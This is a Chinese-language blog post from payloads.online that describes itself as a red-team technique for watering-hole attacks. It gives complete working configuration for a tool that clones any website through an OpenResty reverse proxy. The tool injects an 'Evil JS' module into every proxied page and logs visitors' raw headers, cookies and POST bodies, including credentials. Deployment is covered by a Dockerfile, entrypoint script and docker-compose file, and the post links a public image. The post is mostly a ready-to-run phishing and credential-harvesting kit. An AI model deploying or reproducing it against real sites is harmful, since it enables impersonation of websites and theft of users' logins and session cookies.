<!DOCTYPE html>
<html lang=""><head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <title>红队技巧：基于反向代理的水坑攻击</title>
    <meta name="description" content="倾旋的博客">
    <meta name="author" content='倾旋'>

    <link href="https://fonts.googleapis.com/css2?family=Inconsolata:wght@400;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" integrity="sha384-TX8t27EcRE3e/ihU7zmQxVncDAy5uIKz4rEkgIXeMed4M0jlfIDPvg6uqKI2xXr2" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w==" crossorigin="anonymous">

    
    <link rel="stylesheet" href="/sass/researcher.min.css">

    
        <link rel="icon" type="image/ico" href="https://payloads.online/favicon.ico">
    

    
        
    
</head>

    <body><div class="container mt-5">
    <nav class="navbar navbar-expand-sm flex-column flex-sm-row text-nowrap p-0">
        <a class="navbar-brand mx-0 mr-sm-auto" style="color: #dc3545;" href="https://payloads.online" title="倾旋的博客">
          
          倾旋的博客
        </a>
        <div class="navbar-nav flex-row flex-wrap justify-content-center">
            
                
                
                    <a class="nav-item nav-link" href="/about" title="About">
                        About
                    </a>
                    
                        <span class="nav-item navbar-text mx-1">/</span>
                    
                
                    <a class="nav-item nav-link" href="/projects/" title="Projects">
                        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-terminal-fill" viewBox="0 0 16 16"><path d="M0 3a2 2 0 0 1 2-2h12a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2V3zm9.5 5.5h-3a.5.5 0 0 0 0 1h3a.5.5 0 0 0 0-1zm-6.354-.354a.5.5 0 1 0 .708.708l2-2a.5.5 0 0 0 0-.708l-2-2a.5.5 0 1 0-.708.708L4.793 6.5 3.146 8.146z"/></svg> Projects
                    </a>
                    
                        <span class="nav-item navbar-text mx-1">/</span>
                    
                
                    <a class="nav-item nav-link" href="/links/" title="Links">
                        Links
                    </a>
                    
                        <span class="nav-item navbar-text mx-1">/</span>
                    
                
                    <a class="nav-item nav-link" href="/post/" title="Posts">
                        Posts
                    </a>
                    
                        <span class="nav-item navbar-text mx-1">/</span>
                    
                
                    <a class="nav-item nav-link" href="/index.xml" title="Rss">
                        Rss
                    </a>
                    
                        <span class="nav-item navbar-text mx-1">/</span>
                    
                
                    <a class="nav-item nav-link" href="/tools/" title="Tools">
                        Tools
                    </a>
                    
                
            
        </div>
    </nav>
</div>
<hr>
<div id="content">
<div class="container">
    <p>完整项目代码：https://github.com/Rvn0xsy/Pricking</p>
<h2 id="0x00-前言">0x00 前言</h2>
<p>在红队行动中，一般使用邮件钓鱼会携带诱饵附件，但常被邮件网关拦截，如果想要去收集更多的有效信息，可以在邮件中埋入水坑链接。而埋入的水坑的制作，对于红队来说又有些繁琐，因此本文记录一下我实现自动化这块的工作。</p>
<h2 id="0x01-实现目标">0x01 实现目标</h2>
<p>先明确一下实现目标：</p>
<ul>
<li>支持快速部署</li>
<li>完美克隆任意网站</li>
<li>可扩展的模块（受害者执行）</li>
<li>收集所有凭证（除了Cookie还有POST数据）</li>
</ul>
<h2 id="0x02-快速部署与完美克隆">0x02 快速部署与完美克隆</h2>
<p>互联网上有许多网页克隆的工具，大多都是将网页的前端文件（html、js、图片等）下载到本地，这个方式即使自动化也很难与网站真实后端无缝对接。于是我采用Nginx的反向代理功能来实现完美克隆，让我的Web服务器充当一个真实的客户端。但Nginx本身默认情况下，没办法做到很灵活的逻辑操作，因此需要采用OpenResty内置的Lua脚本Block。</p>
<p><a href="http://openresty.org/cn/">OpenResty®</a> 是一个基于 Nginx 与 Lua 的高性能 Web 平台，其内部集成了大量精良的 Lua 库、第三方模块以及大多数的依赖项。用于方便地搭建能够处理超高并发、扩展性极高的动态 Web 应用、Web 服务和动态网关。</p>
<p>根据它的官方文档和<a href="https://github.com/openresty/docker-openresty">开源仓库</a>我找到了Docker环境，使用Docker镜像就能解决快速部署的问题了。</p>
<p>首先拉取镜像到本地，方便后续的操作：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">docker pull openresty/openresty:alpine
</code></pre></div><h3 id="openresty配置文件">OpenResty配置文件</h3>
<p>OpenResty Docker环境共有两块需要关注的配置文件：</p>
<ul>
<li>/etc/nginx/conf.d</li>
<li><a href="https://github.com/openresty/docker-openresty/blob/master/nginx.conf">/usr/local/openresty/nginx/conf/nginx.conf</a></li>
</ul>
<p>其中主配置文件是最精简的，我根据OpenResty的文档优化了一个，后续Dockerfile的编写也是替换的主配置文件。</p>
<h3 id="openresty---lua-ngx-api">OpenResty - Lua Ngx API</h3>
<p>若想要在Nginx配置中执行Lua代码，需要遵循<a href="https://openresty-reference.readthedocs.io/en/latest/Lua_Nginx_API/">Lua Ngx API</a>，文档中提供了<code>*_by_lua</code>，<code>*_by_lua_block</code>和<code>*_by_lua_file</code>来引入Lua代码。</p>
<p><code>nginx.conf</code>简单实例：</p>
<pre><code>worker_processes  1;

error_log  logs/error.log error;    # 日志级别

events {
    worker_connections  1024;
}

http {
    server {
        listen    80;
        location / {
            content_by_lua_block {
                ngx.say(&quot;Hello,Rvn0xsy&quot;);
            }
        }
    }
}
</code></pre><p>当OpenResty环境以<code>nginx.conf</code>作为配置文件启动的话，访问网站会输出<code>Hello,Rvn0xsy</code>。</p>
<h3 id="lua-ngx-api---block">Lua Ngx API - Block</h3>
<p>《OpenResty 最佳实践》中提供了一个流程图：</p>
<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/5f574b2d15e2743767e2914af6691728.png" alt="2021-02-16-16-48-59"></p>
<p>根据这个流程图，可以将Lua代码放入不同的流程中对数据进行修改、删除、添加等。</p>
<p>如上面的<code>Hello,Rvn0xsy</code>例子，就是通过<code>content_by_lua_block</code>这个环节对响应内容进行修改。</p>
<p>本文用到的Block有：</p>
<ul>
<li>header_filter_by_lua_block 用于修改响应头</li>
<li>body_filter_by_lua_block 用于修改响应内容，注入JS</li>
<li>log_by_lua_block 用于记录请求日志或凭证</li>
</ul>
<h3 id="nginx-反向代理配置">Nginx 反向代理配置</h3>
<p><a href="https://docs.nginx.com/nginx/admin-guide/web-server/reverse-proxy/">Nginx反向代理</a>配置起来非常简单。</p>
<pre><code>location /some/path/ {
    proxy_pass http://www.example.com/link/;
}
</code></pre><p><code>location</code>用于做URI匹配，当访问到<code>/some/path/</code>这个路径时，Nginx就代表客户端去访问<code>http://www.example.com/link/</code>，整个过程对客户端是完全透明的。</p>
<p>根据这个实例，可以直接写下第一部分，反向代理的配置了：</p>
<pre><code>location / {
    proxy_pass http://www.example.com/link/;
}
</code></pre><p>访问根目录就等同于访问<code>http://www.example.com/link/</code>。</p>
<p>这里可能会产生一个问题，如果目标Web服务器对Host进行了判断，那么反向代理可能不会成功，因此需要将完美克隆的目标Host进行设置。</p>
<pre><code>worker_processes  1;

error_log  logs/error.log error;    # 日志级别

events {
    worker_connections  1024;
}

http {
    server {
        listen    80;
        server_name example-1.com;
        location / {
            proxy_pass http://www.example.com/link/;
            proxt_set_header Host www.example.com;
            proxt_set_header Referer http://www.example.com/link/;
        }
    }
}
</code></pre><p>至此，就能完美克隆目标网站了。</p>
<h2 id="0x03-注入模块化的evil-js">0x03 注入模块化的Evil JS</h2>
<p>使用<code>body_filter_by_lua_block</code>可以对网站内容进行修改，利用好这个功能，就能将JS文件引入到页面中。</p>
<pre><code>header_filter_by_lua_block { ngx.header.content_length = nil}
                body_filter_by_lua_block{
                        local chunk, eof = ngx.arg[1], ngx.arg[2]
                        local buffered = ngx.ctx.buffered
                        if not buffered then
                           buffered = {}
                           ngx.ctx.buffered = buffered
                        end
                        if chunk ~= &quot;&quot; then
                           buffered[#buffered + 1] = chunk
                           ngx.arg[1] = nil
                        end
                        if eof then
                           local whole = table.concat(buffered)
                           ngx.ctx.buffered = nil
                           whole = whole .. &quot;&lt;script src='/7276df76835ed2272cc0e59f55e49902/static.js' type='module'&gt;&lt;/script&gt;&quot;
                           ngx.arg[1] = whole
                        end
                }

</code></pre><p>在修改网页内容之前，需要通过<code>header_filter_by_lua_block</code>将<code>Content-Length</code>进行清空，因为修改后，<code>Content-Length</code>的大小一定是改变的。</p>
<h3 id="使用es6标准将js模块化">使用ES6+标准将JS模块化</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;/7276df76835ed2272cc0e59f55e49902/static.js&#39;</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;module&#39;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
</code></pre></div><p>其中<code>static.js</code>就是引入的Evil JS，添加了<code>type='module'</code>是为了启用<a href="https://www.freecodecamp.org/news/learn-modern-javascript/">ES6+</a>标准。</p>
<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/8e4954b7fb5035a91688a21d78633140.png" alt="2021-02-16-17-10-54"></p>
<p>为了不和源站的目录冲突，<code>7276df76835ed2272cc0e59f55e49902</code>其实是一个虚拟的目录，通过<code>location</code>映射即可。</p>
<pre><code>location ^~ /7276df76835ed2272cc0e59f55e49902/ {
                alias    /tmp/pricking/static/;
}
</code></pre><p>关于Import的说明可以看<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/import">这篇文章</a>。</p>
<p>使用模块化功能可以让这个项目吸收更多关于浏览器丰富的操作，就像XSS平台那样。</p>
<h2 id="0x04-记录日志或凭证">0x04 记录日志或凭证</h2>
<p>由于<code>log_by_lua_block</code>是最后一个流程，可以把一些数据进行收集，写入日志文件。</p>
<pre><code>...

http {
    ....
    log_format  logeverything  '$current_time - $remote_addr \n$request_headers \n\n$request_body\n';
  
    server {
            set $request_headers &quot;&quot;;
            set $current_time &quot;&quot;;
           ....

            location / {
                ...
                log_by_lua_block {
                    ngx.var.current_time = ngx.localtime()                  
                    ngx.var.request_headers = ngx.req.raw_header()
                }
        }
        access_log /tmp/pricking/access.log logeverything;
    }
}
</code></pre><p><code>ngx.localtime()</code>和<code>ngx.req.raw_header()</code>是调用了<a href="https://openresty-reference.readthedocs.io/en/latest/Lua_Nginx_API/">Lua Ngx API</a>。</p>
<h2 id="0x05-最终配置">0x05 最终配置</h2>
<pre><code>worker_processes  1;
events {
    worker_connections  1024;
}


http {
    include       mime.types;
    default_type  application/octet-stream;
    sendfile        on;
    log_format  logeverything  '$current_time - $remote_addr \n$request_headers \n\n$request_body\n';
    

    server {
            set $request_headers &quot;&quot;;
            set $current_time &quot;&quot;;

            server_name proxy.payloads.online;
            listen 80;

            location ^~ /7276df76835ed2272cc0e59f55e49902/ {
                alias    /tmp/pricking/static/;
            }


            location / {
                proxy_pass http://payloads.online;
                proxy_set_header Host payloads.online;
                header_filter_by_lua_block { ngx.header.content_length = nil}
                body_filter_by_lua_block{
                        local chunk, eof = ngx.arg[1], ngx.arg[2]
                        local buffered = ngx.ctx.buffered
                        if not buffered then
                           buffered = {}
                           ngx.ctx.buffered = buffered
                        end
                        if chunk ~= &quot;&quot; then
                           buffered[#buffered + 1] = chunk
                           ngx.arg[1] = nil
                        end
                        if eof then
                           local whole = table.concat(buffered)
                           ngx.ctx.buffered = nil
                           whole = whole .. &quot;&lt;script src='/7276df76835ed2272cc0e59f55e49902/static.js' type='module'&gt;&lt;/script&gt;&quot;
                           ngx.arg[1] = whole
                        end
                }
                log_by_lua_block {
                    ngx.var.current_time = ngx.localtime()                  
                    ngx.var.request_headers = ngx.req.raw_header()
                }
        }
        access_log /tmp/pricking/access.log logeverything;
    }
}
</code></pre><h2 id="0x06-dockerfile编写">0x06 Dockerfile编写</h2>
<p>Dockerfile :</p>
<pre><code>FROM openresty/openresty:alpine
ENV PROXY_PASS_HOST www.baidu-proxy.com # 自己的域名
ENV PROXY_SOURCE_HOST www.baidu.com # 要克隆的域名
ENV NGINX_LISTEN_PORT 80 # 监听端口，不建议改动
ENV EVIL_JS_URI b026324c6904b2a9cb4b88d6d61c81d1 # JS虚拟目录名称
WORKDIR /tmp/
COPY nginx.conf /usr/local/openresty/nginx/conf/nginx.conf
COPY docker-entrypoint.sh /tmp/docker-entrypoint.sh
RUN mkdir -p /tmp/pricking/static/ &amp;&amp; chmod +x /tmp/docker-entrypoint.sh 
ENTRYPOINT [&quot;/tmp/docker-entrypoint.sh&quot;]
</code></pre><p>通过设置环境变量的值，就能完美克隆任意网站。</p>
<p>docker-entrypoint.sh :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/sh
</span><span style="color:#75715e"></span>echo <span style="color:#e6db74">&#34;[+] Replace evil js URI...&#34;</span>

sed -e <span style="color:#e6db74">&#39;s/7276df76835ed2272cc0e59f55e49902/b026324c6904b2a9cb4b88d6d61c81d1/&#39;</span> <span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span>        -e <span style="color:#e6db74">&#34;18s/proxy.payloads.online/</span>$PROXY_PASS_HOST<span style="color:#e6db74">/g&#34;</span> <span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span>        -e <span style="color:#e6db74">&#34;27s/payloads.online/</span>$PROXY_SOURCE_HOST<span style="color:#e6db74">/g&#34;</span> <span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span>        -e <span style="color:#e6db74">&#34;28s/payloads.online/</span>$PROXY_SOURCE_HOST<span style="color:#e6db74">/g&#34;</span> <span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span>        -e <span style="color:#e6db74">&#34;19s/80/</span>$NGINX_LISTEN_PORT<span style="color:#e6db74">/g&#34;</span> /usr/local/openresty/nginx/conf/nginx.conf &gt; /usr/local/openresty/nginx/conf/nginx.conf.new
mv /usr/local/openresty/nginx/conf/nginx.conf.new /usr/local/openresty/nginx/conf/nginx.conf

echo <span style="color:#e6db74">&#34;[+] Replace server name : </span>$PROXY_PASS_HOST<span style="color:#e6db74">&#34;</span>

echo <span style="color:#e6db74">&#34;[+] Listen PORT : </span>$NGINX_LISTEN_PORT<span style="color:#e6db74">&#34;</span>
echo <span style="color:#e6db74">&#34;[+] Proxy Pass Host : </span>$PROXY_SOURCE_HOST<span style="color:#e6db74">&#34;</span>

echo <span style="color:#e6db74">&#34;[+] Evil js URL :  </span>$PROXY_PASS_HOST<span style="color:#e6db74">/</span>$EVIL_JS_URI<span style="color:#e6db74">/static.js&#34;</span>
/usr/local/openresty/nginx/sbin/nginx -g <span style="color:#e6db74">&#34;daemon off;&#34;</span> -c /usr/local/openresty/nginx/conf/nginx.conf
</code></pre></div><h2 id="0x07-docker-compose">0x07 docker-compose</h2>
<p>我将镜像上传到了Docker镜像源中，可以通过如下docker-compose.yml创建实例：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-yml" data-lang="yml"><span style="color:#f92672">version</span>: <span style="color:#e6db74">&#39;3&#39;</span>
<span style="color:#f92672">services</span>:
  <span style="color:#f92672">nginx</span>:
    <span style="color:#f92672">image</span>: <span style="color:#ae81ff">rvn0xsy/pricking:v1</span>
    <span style="color:#f92672">ports</span>:
     - <span style="color:#e6db74">&#34;80:80&#34;</span>
    <span style="color:#f92672">volumes</span>:
     - <span style="color:#ae81ff">/tmp/pricking:/tmp/pricking</span>
    <span style="color:#f92672">environment</span>:
      <span style="color:#f92672">PROXY_PASS_HOST</span>: <span style="color:#ae81ff">proxy.payloads.online</span>
      <span style="color:#f92672">PROXY_SOURCE_HOST</span>: <span style="color:#ae81ff">payloads.online</span>
      <span style="color:#f92672">NGINX_LISTEN_PORT</span>: <span style="color:#ae81ff">80</span>
      <span style="color:#f92672">EVIL_JS_URI</span>: <span style="color:#ae81ff">b026324c6904b2a9cb4b88d6d61c81d1</span>
</code></pre></div><p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/90e7da8488bdf08b40b763330aaa583f.png" alt="2021-02-16-17-40-24"></p>
<p>日志：</p>
<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2bbb5c207533adc7845d579c730bdd84.png" alt="2021-02-16-17-41-55"></p>
<h2 id="参考">参考</h2>
<ul>
<li><a href="https://github.com/openresty/docker-openresty">https://github.com/openresty/docker-openresty</a></li>
<li><a href="https://openresty-reference.readthedocs.io/en/latest/Lua_Nginx_API/">https://openresty-reference.readthedocs.io/en/latest/Lua_Nginx_API/</a></li>
<li><a href="https://docs.nginx.com/nginx/admin-guide/web-server/reverse-proxy/">https://docs.nginx.com/nginx/admin-guide/web-server/reverse-proxy/</a></li>
<li><a href="https://www.freecodecamp.org/news/learn-modern-javascript/">https://www.freecodecamp.org/news/learn-modern-javascript/</a></li>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/import">https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/import</a></li>
</ul>

</div>

        </div><div id="footer" class="mb-5">
    <hr>
    <div class="container text-center">
        
            <a href="https://twitter.com/Rvn0xsy" class="fab fa-twitter fa-1x" title="Twitter"></a>
        
            <a href="mailto:rvn0xsy@gmail.com" class="fas fa-envelope fa-1x" title="E-mail"></a>
        
    </div>
    
        <div class="container text-center">
            <a href="https://payloads.online" title="- PAYLOADS.ONLINE -"><small>- PAYLOADS.ONLINE -</small></a>
        </div>
    
</div>



<script src="https://cdn.jsdelivr.net/gh/jmnote/plantuml-encoder@1.2.4/dist/plantuml-encoder.min.js" integrity="sha256-Qsk2KRBCN5qVZX7B+8+2IvQl1Aqc723qV1tBCQaVoqo=" crossorigin="anonymous"></script>
<script>
(function(){
  let plantumlPrefix = "language-plantuml";
  Array.prototype.forEach.call(document.querySelectorAll("[class^=" + plantumlPrefix + "]"), function(code){
    let image = document.createElement("IMG");
    image.loading = 'lazy'; 
    image.src = 'http://www.plantuml.com/plantuml/svg/~1' + plantumlEncoder.encode(code.innerText);
    code.parentNode.insertBefore(image, code);
    code.style.display = 'none';
  });
})();
</script>

</body>
</html>
